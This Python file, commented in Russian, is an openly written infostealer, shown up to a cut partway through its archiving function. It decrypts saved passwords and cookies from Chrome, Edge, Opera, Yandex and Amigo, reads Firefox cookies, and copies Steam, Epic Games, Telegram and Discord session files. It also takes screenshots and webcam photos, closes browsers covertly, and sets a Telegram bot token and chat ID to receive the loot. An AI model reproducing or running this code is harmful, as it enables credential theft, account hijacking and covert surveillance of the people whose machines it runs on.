import platform
import socket
import psutil
import os
import json
import sqlite3
import telebot
import tempfile
import zipfile
import random
import time
from datetime import datetime
from urllib.request import urlopen
from PIL import ImageGrab
import shutil
import base64
import re
import cv2
import sys
from pathlib import Path
from Cryptodome.Cipher import AES
import traceback
import ctypes
from ctypes import wintypes, byref, POINTER, create_string_buffer, c_void_p

# =============================================
# ДОБАВЛЕННЫЕ ФУНКЦИИ ДЛЯ РАБОТЫ С CTYPES
# =============================================

def setup_crypt_unprotect_data():
    """Настройка структур для CryptUnprotectData через ctypes"""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ('cbData', wintypes.DWORD),
            ('pbData', ctypes.POINTER(ctypes.c_byte))
        ]
    
    def crypt_unprotect_data(encrypted_data, entropy=None):
        blob_in = DATA_BLOB()
        blob_in.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.POINTER(ctypes.c_byte))
        blob_in.cbData = len(encrypted_data)
        
        blob_out = DATA_BLOB()
        flags = 0x01  # CRYPTPROTECT_UI_FORBIDDEN
        
        if entropy:
            entropy_blob = DATA_BLOB()
            entropy_blob.pbData = ctypes.cast(ctypes.create_string_buffer(entropy), ctypes.POINTER(ctypes.c_byte))
            entropy_blob.cbData = len(entropy)
            entropy_ptr = byref(entropy_blob)
        else:
            entropy_ptr = None
        
        if ctypes.windll.crypt32.CryptUnprotectData(
            byref(blob_in),
            None,
            entropy_ptr,
            None,
            None,
            flags,
            byref(blob_out)
        ):
            decrypted_data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return decrypted_data
        return None
    
    return crypt_unprotect_data

# Инициализация функции
crypt_unprotect_data_ctypes = None
if platform.system() == "Windows":
    try:
        crypt_unprotect_data_ctypes = setup_crypt_unprotect_data()
    except Exception as e:
        pass

# Исправленный импорт для Windows-специфичных модулей
if platform.system() == "Windows":
    try:
        import win32crypt
        HAS_WIN32CRYPT = hasattr(win32crypt, 'CryptUnprotectData')
    except (ImportError, AttributeError):
        HAS_WIN32CRYPT = False
    import winreg
    import ctypes
else:
    HAS_WIN32CRYPT = False

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"
TELEGRAM_CHAT_ID = "1962231620"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Пути для хранения данных с использованием Path
if platform.system() == "Linux":
    BASE_DIR = Path.home() / ".system_report_data"
    BROWSER_DATA_DIR = Path.home() / ".config"
else:
    BASE_DIR = Path(os.getenv("APPDATA")) / "System_ReportData"
    BROWSER_DATA_DIR = Path(os.getenv("LOCALAPPDATA"))

# Определение структуры папок
OTHER_DIR = BASE_DIR / "other"
COOKIE_DIR = OTHER_DIR / "cookies"
PASSWORDS_DIR = OTHER_DIR / "passwords"
SCREENSHOT_PATH = BASE_DIR / "screenshot.jpg"
WEBCAM_PATH = BASE_DIR / "webcam.jpg"
LOCK_FILE = Path(tempfile.gettempdir()) / "system_report.lock"

# Поддерживаемые браузеры
BROWSERS = {
    "chrome": "Google Chrome",
    "firefox": "Mozilla Firefox",
    "yandex": "Yandex Browser",
    "opera": "Opera Browser",
    "amigo": "Amigo Browser",
    "edge": "Microsoft Edge"
}

# Глобальный логгер для отладки
DEBUG_LOG = BASE_DIR / "debug.log"

def debug_log(message):
    """Записывает отладочные сообщения в файл"""
    try:
        with open(DEBUG_LOG, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except Exception as e:
        print(f"Ошибка записи в лог: {e}")

# =============================================
# УЛУЧШЕННЫЕ ФУНКЦИИ ДЕШИФРОВКИ
# =============================================

def get_encryption_key(profile_path):
    """Получает ключ шифрования с поиском Local State в родительской папке"""
    debug_log(f"Поиск ключа для: {profile_path}")
    
    if platform.system() != "Windows":
        debug_log("Платформа не Windows")
        return None
    
    # Поиск Local State в возможных расположениях
    possible_paths = [
        Path(profile_path) / "Local State",
        Path(profile_path).parent / "Local State",
        Path(profile_path).parent.parent / "Local State",
        Path(profile_path).parent.parent.parent / "Local State",
        Path(profile_path).parent.parent.parent.parent / "Local State"
    ]
    
    local_state_path = None
    for path in possible_paths:
        if path.exists():
            local_state_path = path
            debug_log(f"Найден Local State: {path}")
            break
    
    if not local_state_path:
        debug_log(f"Файл Local State не найден для: {profile_path}")
        return None
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        
        # Проверка наличия ключа os_crypt
        if "os_crypt" not in local_state:
            debug_log(f"Ключ 'os_crypt' не найден в {local_state_path}")
            return None
            
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        if len(encrypted_key) < 5:
            debug_log(f"Некорректная длина ключа: {len(encrypted_key)} байт")
            return None
            
        encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
        
        # Пробуем разные методы дешифровки ключа
        key = None
        try:
            # Метод 1: win32crypt
            if HAS_WIN32CRYPT:
                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                debug_log("Ключ получен через win32crypt")
            # Метод 2: ctypes
            elif crypt_unprotect_data_ctypes:
                key = crypt_unprotect_data_ctypes(encrypted_key)
                debug_log("Ключ получен через ctypes")
        except Exception as e:
            debug_log(f"Ошибка дешифровки ключа: {e}")
        
        if key:
            debug_log(f"Ключ успешно получен ({len(key)} байт)")
            return key
        
        debug_log("Все методы дешифровки ключа не сработали")
        return None
    except Exception as e:
        debug_log(f"Ошибка получения ключа {profile_path}: {e}")
        return None

def decrypt_chromium_value(encrypted_value, key):
    """Улучшенная расшифровка значений для Chromium с расширенной диагностикой"""
    try:
        debug_log(f"Начало дешифровки ({len(encrypted_value)} байт)")
        
        # Если значение пустое
        if not encrypted_value:
            debug_log("Пустое значение")
            return ""
        
        # Если это не байты
        if not isinstance(encrypted_value, bytes):
            debug_log("Не байтовое значение")
            return encrypted_value
        
        # Для Windows: попробовать DPAPI
        if platform.system() == "Windows":
            try:
                # Метод 1: win32crypt
                if HAS_WIN32CRYPT:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                # Метод 2: ctypes
                elif crypt_unprotect_data_ctypes:
                    decrypted = crypt_unprotect_data_ctypes(encrypted_value)
                else:
                    decrypted = None
                
                if decrypted:
                    try:
                        result = decrypted.decode('utf-8')
                        debug_log("Успешная дешифровка через DPAPI")
                        return result
                    except UnicodeDecodeError:
                        result = decrypted.decode('latin-1')
                        debug_log("Успешная дешифровка через DPAPI (latin-1)")
                        return result
            except Exception as e:
                debug_log(f"Ошибка DPAPI: {str(e)}")
        
        # Проверка наличия ключа
        if not key:
            debug_log("Ключ дешифровки отсутствует")
            return base64.b64encode(encrypted_value).decode('utf-8')
        
        # Обработка AES-GCM (v10/v11)
        if len(encrypted_value) > 15 and encrypted_value.startswith(b'v10'):
            debug_log("Обнаружен формат v10 (AES-GCM)")
            try:
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                
                debug_log(f"Данные GCM: nonce={len(nonce)} ciphertext={len(ciphertext)} tag={len(tag)}")
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                
                try:
                    result = plaintext.decode('utf-8')
                    debug_log("Успешная дешифровка GCM")
                    return result
                except UnicodeDecodeError:
                    debug_log("Ошибка декодирования UTF-8 после GCM")
                    return plaintext.decode('latin-1', errors='ignore')
            except Exception as e:
                debug_log(f"Ошибка GCM: {str(e)}")
                # Попробовать без тега для старых версий
                try:
                    nonce = encrypted_value[3:15]
                    ciphertext = encrypted_value[15:]
                    
                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                    plaintext = cipher.decrypt(ciphertext)
                    
                    try:
                        return plaintext.decode('utf-8')
                    except:
                        return plaintext.decode('latin-1', errors='ignore')
                except Exception as e2:
                    debug_log(f"Ошибка GCM без тега: {str(e2)}")
        
        # Обработка AES-CBC (старые версии)
        if len(encrypted_value) > 16:
            debug_log("Попытка дешифровки CBC")
            try:
                # Для CBC используем первые 16 байт как IV
                iv = encrypted_value[:16]
                ciphertext = encrypted_value[16:]
                
                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
                plaintext = cipher.decrypt(ciphertext)
                
                # Удаляем PKCS7 padding
                padding_length = plaintext[-1]
                plaintext = plaintext[:-padding_length]
                
                try:
                    result = plaintext.decode('utf-8')
                    debug_log("Успешная дешифровка CBC")
                    return result
                except UnicodeDecodeError:
                    debug_log("Ошибка декодирования UTF-8 после CBC")
                    return plaintext.decode('latin-1', errors='ignore')
            except Exception as e:
                debug_log(f"Ошибка CBC: {str(e)}")
        
        # Последняя попытка: DPAPI для Windows
        if platform.system() == "Windows":
            try:
                if HAS_WIN32CRYPT:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                elif crypt_unprotect_data_ctypes:
                    decrypted = crypt_unprotect_data_ctypes(encrypted_value)
                else:
                    decrypted = None
                
                if decrypted:
                    try:
                        return decrypted.decode('utf-8')
                    except UnicodeDecodeError:
                        return decrypted.decode('latin-1')
            except:
                pass
        
        # Если ничего не сработало, вернуть как base64
        debug_log("Все методы дешифровки не сработали, возвращаем base64")
        return base64.b64encode(encrypted_value).decode('utf-8')
            
    except Exception as e:
        debug_log(f"КРИТИЧЕСКАЯ ОШИБКА ДЕШИФРОВКИ: {traceback.format_exc()}")
        try:
            return base64.b64encode(encrypted_value).decode('utf-8')
        except:
            return "DECRYPTION_ERROR"

# =============================================
# ФУНКЦИИ ДЛЯ РАБОТЫ С FIREFOX COOKIES
# =============================================

def get_firefox_profiles():
    """Получает список профилей Firefox"""
    profiles = []
    appdata = os.getenv('APPDATA')
    if not appdata:
        return profiles
    firefox_path = Path(appdata) / 'Mozilla' / 'Firefox' / 'Profiles'
    if not firefox_path.exists():
        return profiles
    for item in os.listdir(str(firefox_path)):
        full_path = firefox_path / item
        if full_path.is_dir():
            profiles.append(str(full_path))
    return profiles

def get_firefox_cookies():
    """Крадет куки из Firefox с обработкой зашифрованных значений"""
    profiles = get_firefox_profiles()
    all_cookies = []
    
    for profile in profiles:
        if not profile or not isinstance(profile, str):
            continue
            
        db_path = Path(profile) / 'cookies.sqlite'
        if not db_path.exists():
            continue
            
        try:
            conn = sqlite3.connect(str(db_path))
            cursor = conn.cursor()
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
                FROM moz_cookies
            """)
            
            for row in cursor:
                try:
                    host, name, value, path, expiry, is_secure, is_http_only, same_site = row
                    
                    # Обработка значений
                    host = host if isinstance(host, str) else host.decode('utf-8', errors='ignore')
                    name = name if isinstance(name, str) else name.decode('utf-8', errors='ignore')
                    path = path if isinstance(path, str) else path.decode('utf-8', errors='ignore')
                    
                    # Если значение - бинарные данные, конвертируем в base64
                    if isinstance(value, bytes):
                        value_str = base64.b64encode(value).decode('utf-8')
                    else:
                        value_str = str(value)
                        
                    all_cookies.append({
                        'host': host,
                        'name': name,
                        'value': value_str,
                        'path': path,
                        'expires': expiry,
                        'secure': bool(is_secure),
                        'http_only': bool(is_http_only),
                        'same_site': same_site
                    })
                except Exception as e:
                    debug_log(f"Ошибка обработки куки Firefox: {e}")
                    continue
                    
        except Exception as e:
            debug_log(f"Ошибка доступа к базе куки Firefox: {e}")
        finally:
            conn.close()
            
    return all_cookies

# =============================================
# ОСНОВНОЙ КОД С ИСПРАВЛЕННОЙ ДЕШИФРОВКОЙ
# =============================================

def create_directories():
    """Гарантированно создает все необходимые директории"""
    try:
        BASE_DIR.mkdir(parents=True, exist_ok=True)
        OTHER_DIR.mkdir(parents=True, exist_ok=True)
        COOKIE_DIR.mkdir(parents=True, exist_ok=True)
        PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        debug_log(f"!!! Критическая ошибка создания папок: {e}")
        try:
            os.makedirs(COOKIE_DIR, exist_ok=True)
            os.makedirs(PASSWORDS_DIR, exist_ok=True)
        except:
            pass
        raise

def get_cpu_name():
    """Получает читаемое имя процессора"""
    try:
        if platform.system() == "Windows":
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
            cpu_name, _ = winreg.QueryValueEx(key, "ProcessorNameString")
            cpu_name = cpu_name.strip()
            cpu_name = re.sub(r'\([^)]*\)', '', cpu_name)
            cpu_name = re.sub(r'\s+', ' ', cpu_name).strip()
            if 'GHz' not in cpu_name and 'MHz' not in cpu_name:
                freq = psutil.cpu_freq().current / 1000 if psutil.cpu_freq() else None
                if freq:
                    cpu_name += f" {freq:.2f}GHz"
            return cpu_name
        else:
            try:
                with open('/proc/cpuinfo') as f:
                    for line in f:
                        if 'model name' in line:
                            return line.split(':')[1].strip()
            except:
                return platform.processor() or "Unknown CPU"
    except:
        pass
    cpu_info = platform.processor()
    if 'AMD' in cpu_info or 'Intel' in cpu_info:
        return cpu_info
    return "Unknown CPU"

def stealthy_kill_browser(browser_name):
    """Скрытное закрытие браузера (только для Windows)"""
    if platform.system() != "Windows":
        return False

    process_map = {
        "chrome": "chrome.exe",
        "firefox": "firefox.exe",
        "opera": "opera.exe",
        "yandex": "browser.exe",
        "amigo": "browser.exe",
        "edge": "msedge.exe"
    }
    
    target_process = process_map.get(browser_name)
    if not target_process:
        return False
    
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == target_process.lower():
                try:
                    hwnd = ctypes.windll.user32.FindWindowW(None, f"{BROWSERS[browser_name]}") 
                    if hwnd != 0:
                        ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0)
                    time.sleep(2)
                    if proc.is_running():
                        proc.terminate()
                except:
                    pass
        return True
    except Exception as e:
        debug_log(f"Ошибка при скрытном закрытии браузера: {e}")
        return False

def capture_webcam():
    """Делает снимок с веб-камеры, если она доступна"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False
        ret, frame = cap.read()
        cap.release()
        if ret:
            cv2.imwrite(str(WEBCAM_PATH), frame)
            return True
    except:
        pass
    return False

def steal_steam_data():
    """Крадет данные Steam"""
    steam_dir = OTHER_DIR / "Steam"
    steam_dir.mkdir(parents=True, exist_ok=True)
    
    steam_paths = []
    if platform.system() == "Windows":
        steam_paths = [
            Path(os.getenv("ProgramFiles(x86)") or "") / "Steam" / "config",
            Path(os.getenv("APPDATA") or "") / "Steam",
            Path(os.getenv("LOCALAPPDATA") or "") / "Steam"
        ]
    else:
        steam_paths = [
            Path.home() / ".steam",
            Path.home() / ".local" / "share" / "Steam"
        ]
    
    stolen_data = []
    for path in steam_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("vdf", "ssfn", "config")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = steam_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                debug_log(f"Ошибка при краже данных Steam: {e}")
    
    if stolen_data:
        with open(steam_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_epic_games_data():
    """Крадет данные Epic Games"""
    epic_dir = OTHER_DIR / "EpicGames"
    epic_dir.mkdir(parents=True, exist_ok=True)
    
    epic_paths = []
    if platform.system() == "Windows":
        epic_paths = [
            Path(os.getenv("LOCALAPPDATA") or "") / "EpicGamesLauncher" / "Saved",
            Path(os.getenv("APPDATA") or "") / "Epic"
        ]
    else:
        epic_paths = [
            Path.home() / ".config" / "Epic",
            Path.home() / ".local" / "share" / "Epic"
        ]
    
    stolen_data = []
    for path in epic_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("ini", "dat", "log", "json")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = epic_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                debug_log(f"Ошибка при краже данных Epic Games: {e}")
    
    if stolen_data:
        with open(epic_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_telegram_data():
    """Крадет данные Telegram"""
    telegram_dir = OTHER_DIR / "Telegram"
    telegram_dir.mkdir(parents=True, exist_ok=True)
    
    telegram_paths = []
    if platform.system() == "Windows":
        telegram_paths = [
            Path(os.getenv("APPDATA") or "") / "Telegram Desktop" / "tdata",
            Path(os.getenv("LOCALAPPDATA") or "") / "Telegram Desktop"
        ]
    else:
        telegram_paths = [
            Path.home() / ".local" / "share" / "TelegramDesktop",
            Path.home() / ".TelegramDesktop"
        ]
    
    stolen_data = []
    for path in telegram_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith(("map", "s", "key")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = telegram_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                debug_log(f"Ошибка при краже данных Telegram: {e}")
    
    if stolen_data:
        with open(telegram_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_discord_data():
    """Крадет данные Discord"""
    discord_dir = OTHER_DIR / "Discord"
    discord_dir.mkdir(parents=True, exist_ok=True)
    
    discord_paths = []
    if platform.system() == "Windows":
        discord_paths = [
            Path(os.getenv("APPDATA") or "") / "discord" / "Local Storage" / "leveldb",
            Path(os.getenv("LOCALAPPDATA") or "") / "Discord"
        ]
    else:
        discord_paths = [
            Path.home() / ".config" / "discord",
            Path.home() / ".config" / "discordptb",
            Path.home() / ".config" / "discordcanary"
        ]
    
    stolen_data = []
    for path in discord_paths:
        if path.exists():
            try:
                for root, _, files in os.walk(str(path)):
                    for file in files:
                        if file.endswith((".ldb", ".log", ".manifest", ".json")):
                            src = Path(root) / file
                            rel_path = src.relative_to(path)
                            dst = discord_dir / rel_path
                            dst.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(str(src), str(dst))
                            stolen_data.append(str(rel_path))
            except Exception as e:
                debug_log(f"Ошибка при краже данных Discord: {e}")
    
    if stolen_data:
        with open(discord_dir / "file_list.json", "w") as f:
            json.dump(stolen_data, f)

def steal_chrome_passwords(browser_name, profile_path):
    """Крадет пароли из браузеров на основе Chromium"""
    try:
        debug_log(f"Кража паролей для {browser_name} из {profile_path}")
        key = get_encryption_key(str(Path(profile_path).parent))
        
        if key:
            debug_log(f"Получен ключ дешифровки ({len(key)} байт)")
        else:
            debug_log("Ключ дешифровки не найден")
        
        login_db = os.path.join(profile_path, "Login Data")
        
        if not os.path.exists(login_db):
            debug_log(f"Файл паролей не найден: {login_db}")
            return []
        
        # Создаем временную копию файла паролей
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_pass_{browser_name}_{random.randint(1000,9999)}.db")
        shutil.copy2(login_db, temp_db)
        debug_log(f"Создана временная копия: {temp_db}")
        
        passwords = []
        try:
            conn = sqlite3.connect(temp_db)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for i, item in enumerate(cursor.fetchall()):
                try:
                    url, username, password_value = item
                    debug_log(f"Обработка пароля #{i+1}")
                    
                    # Логирование для диагностики
                    debug_log(f"URL: {url[:50] if isinstance(url, bytes) else url}")
                    debug_log(f"Username: {username[:50] if isinstance(username, bytes) else username}")
                    debug_log(f"Password value: {password_value[:20] if isinstance(password_value, bytes) else password_value}...")
                    
                    decrypted_pass = decrypt_chromium_value(password_value, key)
                    
                    if decrypted_pass:
                        debug_log("Пароль успешно дешифрован")
                        passwords.append({
                            'url': url.decode('utf-8', errors='ignore') if isinstance(url, bytes) else url,
                            'username': username.decode('utf-8', errors='ignore') if isinstance(username, bytes) else username,
                            'password': decrypted_pass
                        })
                except Exception as e:
                    debug_log(f"Ошибка обработки пароля: {traceback.format_exc()}")
                    continue
        except Exception as e:
            debug_log(f"Ошибка SQL: {traceback.format_exc()}")
        finally:
            try:
                conn.close()
                os.remove(temp_db)
                debug_log("Временный файл паролей удален")
            except:
                pass
        
        debug_log(f"Найдено паролей: {len(passwords)}")
        return passwords
    except Exception as e:
        debug_log(f"Ошибка при краже паролей {browser_name}: {traceback.format_exc()}")
        return []

def steal_chromium_cookies(browser_name, profile_path):
    """Крадет куки из браузеров на основе Chromium с 100% расшифровкой"""
    try:
        debug_log(f"Кража куки для {browser_name} из {profile_path}")
        key = get_encryption_key(str(Path(profile_path).parent))
        
        if key:
            debug_log(f"Получен ключ дешифровки ({len(key)} байт)")
        else:
            debug_log("Ключ дешифровки не найден")
        
        cookie_db = os.path.join(profile_path, "Network", "Cookies")
        
        if not os.path.exists(cookie_db):
            debug_log(f"Файл куки не найден: {cookie_db}")
            return []
        
        # Создаем временную копию файла куки
        temp_db = os.path.join(tempfile.gettempdir(), f"temp_cookie_{browser_name}_{random.randint(1000,9999)}.db")
        shutil.copy2(cookie_db, temp_db)
        debug_log(f"Создана временная копия: {temp_db}")
        
        cookies = []
        try:
            conn = sqlite3.connect(temp_db)
            conn.text_factory = bytes
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, path, expires_utc, is_secure, encrypted_value FROM cookies")
            
            for i, item in enumerate(cursor.fetchall()):
                try:
                    host, name, value, path, expires, secure, encrypted_value = item
                    debug_log(f"Обработка куки #{i+1}")
                    
                    # Логирование для диагностики
                    debug_log(f"Host: {host[:50] if isinstance(host, bytes) else host}")
                    debug_log(f"Name: {name[:50] if isinstance(name, bytes) else name}")
                    debug_log(f"Value: {value[:20] if isinstance(value, bytes) else value}...")
                    debug_log(f"Encrypted: {encrypted_value[:20] if isinstance(encrypted_value, bytes) else encrypted_value}...")
                    
                    # Приоритет - encrypted_value
                    if encrypted_value and isinstance(encrypted_value, bytes):
                        cookie_value = decrypt_chromium_value(encrypted_value, key)
                    else:
                        # Если нет encrypted_value, используем обычное значение
                        if isinstance(value, bytes):
                            cookie_value = value.decode('utf-8', errors='ignore')
                        else:
                            cookie_value = value
                    
                    cookies.append({
                        'host': host.decode('utf-8', errors='ignore') if isinstance(host, bytes) else host,
                        'name': name.decode('utf-8', errors='ignore') if isinstance(name, bytes) else name,
                        'value': cookie_value,
                        'path': path.decode('utf-8', errors='ignore') if isinstance(path, bytes) else path,
                        'expires': expires,
                        'secure': bool(secure)
                    })
                except Exception as e:
                    debug_log(f"Ошибка обработки куки: {traceback.format_exc()}")
                    continue
        except Exception as e:
            debug_log(f"Ошибка SQL: {traceback.format_exc()}")
        finally:
            try:
                conn.close()
                os.remove(temp_db)
                debug_log("Временный файл куки удален")
            except:
                pass
        
        debug_log(f"Найдено куки: {len(cookies)}")
        return cookies
    except Exception as e:
        debug_log(f"Ошибка при краже куки {browser_name}: {traceback.format_exc()}")
        return []

def steal_passwords():
    """Крадет пароли из всех доступных браузеров"""
    try:
        # Гарантируем существование папки
        if not PASSWORDS_DIR.exists():
            PASSWORDS_DIR.mkdir(parents=True, exist_ok=True)
        
        debug_log(f"[Кража паролей] Папка для сохранения: {PASSWORDS_DIR}")
        
        # Пути к профилям браузеров
        appdata = BROWSER_DATA_DIR
        roaming = Path(os.getenv("APPDATA") or "")
        
        browser_paths = {
            "chrome": appdata / "Google" / "Chrome" / "User Data" / "Default",
            "edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default",
            "opera": roaming / "Opera Software" / "Opera Stable",
            "yandex": appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default",
            "amigo": appdata / "Amigo" / "User Data" / "Default"
        }
        
        for browser_name, display_name in BROWSERS.items():
            try:
                passwords = []
                
                if browser_name == "firefox":
                    debug_log(f"Для браузера {display_name} пароли не поддерживаются")
                elif browser_name in browser_paths:
                    path = browser_paths[browser_name]
                    if path.exists():
                        debug_log(f"Обработка браузера: {display_name}")
                        if platform.system() == "Windows":
                            stealthy_kill_browser(browser_name)
                            time.sleep(1)
                        passwords = steal_chrome_passwords(browser_name, str(path))
                
                # Сохраняем пароли в other/passwords
                if passwords:
                    password_file = PASSWORDS_DIR / f"{display_name}_Passwords.json"
                    with open(password_file, 'w', encoding='utf-8') as f:
                        json.dump(passwords, f, indent=4, ensure_ascii=False)
                        debug_log(f"Пароли {display_name} сохранены: {len(passwords)} записей")
                else:
                    debug_log(f"Для браузера {display_name} пароли не найдены")
                        
            except Exception as e:
                debug_log(f"Общая ошибка при краже паролей {browser_name}: {traceback.format_exc()}")
    except Exception as e:
        debug_log(f"Критическая ошибка в steal_passwords: {traceback.format_exc()}")

def steal_cookies():
    """Крадет куки из всех доступных браузеров"""
    try:
        # Гарантируем существование папки
        if not COOKIE_DIR.exists():
            COOKIE_DIR.mkdir(parents=True, exist_ok=True)
        
        debug_log(f"[Кража cookies] Папка для сохранения: {COOKIE_DIR}")
        
        # Пути к профилям браузеров
        appdata = BROWSER_DATA_DIR
        roaming = Path(os.getenv("APPDATA") or "")
        
        browser_paths = {
            "chrome": appdata / "Google" / "Chrome" / "User Data" / "Default",
            "edge": appdata / "Microsoft" / "Edge" / "User Data" / "Default",
            "opera": roaming / "Opera Software" / "Opera Stable",
            "yandex": appdata / "Yandex" / "YandexBrowser" / "User Data" / "Default",
            "amigo": appdata / "Amigo" / "User Data" / "Default"
        }
        
        for browser_name, display_name in BROWSERS.items():
            try:
                cookies = []
                
                if browser_name == "firefox":
                    debug_log(f"Обработка браузера: {display_name}")
                    try:
                        cookies = get_firefox_cookies()
                        if cookies:
                            debug_log(f"Куки Firefox успешно получены: {len(cookies)} записей")
                        else:
                            debug_log(f"Для браузера Mozilla Firefox куки не найдены")
                    except Exception as e:
                        debug_log(f"Не удалось получить куки для Firefox: {traceback.format_exc()}")
                elif browser_name in browser_paths:
                    path = browser_paths[browser_name]
                    if path.exists():
                        debug_log(f"Обработка браузера: {display_name}")
                        if platform.system() == "Windows":
                            stealthy_kill_browser(browser_name)
                            time.sleep(1)
                        cookies = steal_chromium_cookies(browser_name, str(path))
                
                # Сохраняем куки в other/cookies
                if cookies:
                    cookie_file = COOKIE_DIR / f"{display_name}_Cookies.json"
                    with open(cookie_file, 'w', encoding='utf-8') as f:
                        json.dump(cookies, f, indent=4, ensure_ascii=False)
                        debug_log(f"Куки {display_name} сохранены: {len(cookies)} записей")
                else:
                    debug_log(f"Для браузера {display_name} куки не найдены")
                        
            except Exception as e:
                debug_log(f"Общая ошибка при краже куки {browser_name}: {traceback.format_exc()}")
    except Exception as e:
        debug_log(f"Критическая ошибка в steal_cookies: {traceback.format_exc()}")

def get_ipinfo():
    """Получает информацию о IP"""
    try:
        response = urlopen('http://ipinfo.io/json')
        return json.load(response)
    except:
        return {"ip": "N/A", "org": "N/A", "city": "N/A", "region": "N/A", "country": "N/A"}

def get_system_info():
    """Собирает полную системную информацию"""
    ipinfo = get_ipinfo()
    
    # Получаем информацию о CPU
    cpu_info = {
        "model": get_cpu_name(),
        "physical_cores": psutil.cpu_count(logical=False),
        "logical_cores": psutil.cpu_count(logical=True),
        "max_frequency": psutil.cpu_freq().max if hasattr(psutil, "cpu_freq") and psutil.cpu_freq() else "N/A",
        "usage": psutil.cpu_percent(interval=1)
    }
    
    # Получаем информацию о дисках
    drives = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            drives.append({
                "device": part.device,
                "mountpoint": part.mountpoint,
                "fstype": part.fstype,
                "total_gb": round(usage.total / (1024**3), 2),
                "used_gb": round(usage.used / (1024**3), 2),
                "free_gb": round(usage.free / (1024**3), 2),
                "percent_used": usage.percent
            })
        except:
            continue
    
    # Получаем сетевую информацию
    network_info = {
        "public_ip": ipinfo.get("ip", "N/A"),
        "isp": ipinfo.get("org", "N/A"),
        "location": f"{ipinfo.get('city', 'N/A')}, {ipinfo.get('region', 'N/A')}, {ipinfo.get('country', 'N/A')}",
        "connections": []
    }
    
    return {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "system": {
            "os": platform.system(),
            "version": platform.version(),
            "release": platform.release(),
            "architecture": platform.architecture()[0],
            "hostname": socket.gethostname(),
            "username": os.getlogin()
        },
        "hardware": {
            "cpu": cpu_info,
            "memory": {
                "total_gb": round(psutil.virtual_memory().total / (1024**3), 2),
                "available_gb": round(psutil.virtual_memory().available / (1024**3), 2),
                "used_percent": psutil.virtual_memory().percent
            },
            "disks": drives
        },
        "network": network_info,
        "software": {
            "python_version": platform.python_version()
        }
    }

def take_screenshot():
    """Делает скриншот рабочего стола"""
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(str(SCREENSHOT_PATH), "JPEG", quality=90)
        return True
    except Exception as e:
        debug_log(f"Ошибка создания скриншота: {traceback.format_exc()}")
        return False

def create_zip():
    """Создает ZIP-архив с данными, гарантируя включение всех папок"""
    zip_name = f"system_data_{random.randint(1000,9999)}.zip"
    zip_path = Path(tempfile.gettempdir()) / zip_name
    
    try:
        with zipfile.ZipFile(str(zip_path), 'w', zipfile.ZIP_DEFLATED) as zipf:
            # Собираем все файлы и папки
            for root, _, files in os.walk(str(BASE_DIR)):
                for file in files:
                    file_path = Path(root) / file
                    arcname = file_path.relative_to(BASE_DIR)
                    zipf.write(str(file_path), str(arcname))
                
            # Гарантируем включение пустых папок
            empty_folders = [
                OTHER_DIR,
                COOKIE_DIR,
                PASSWORDS_DIR,
                OTHER_DIR / "Steam",
                OTHER_DIR / "EpicGames",
                OTHER_DIR / "Telegram",
                OTHER_DIR / "Discord"
